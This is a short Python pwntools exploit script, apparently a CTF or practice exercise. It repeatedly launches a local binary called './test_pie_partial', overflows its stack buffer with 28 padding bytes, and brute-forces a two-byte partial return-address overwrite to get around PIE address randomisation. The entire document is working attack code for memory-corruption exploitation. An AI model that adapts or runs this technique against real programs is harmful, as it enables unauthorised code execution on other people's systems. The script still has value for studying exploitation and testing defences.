from pwn import *

context(arch = 'i386', os = 'linux', log_level='debug')
i = 0
while i <= 0xf610:
	try:
		p = process("./test_pie_partial")
		evil_addr = 0x610 + i
		print "evil_addr =>" + hex(evil_addr)
		p.recvline()
		payload = 'A' * 28 + p16(evil_addr) 
		p.sendline(payload)
		i = i + 0x1000
		p.recvline()
		p.recvline()
		print p.recvline()
	except Exception as e:
		p.close()
		print e
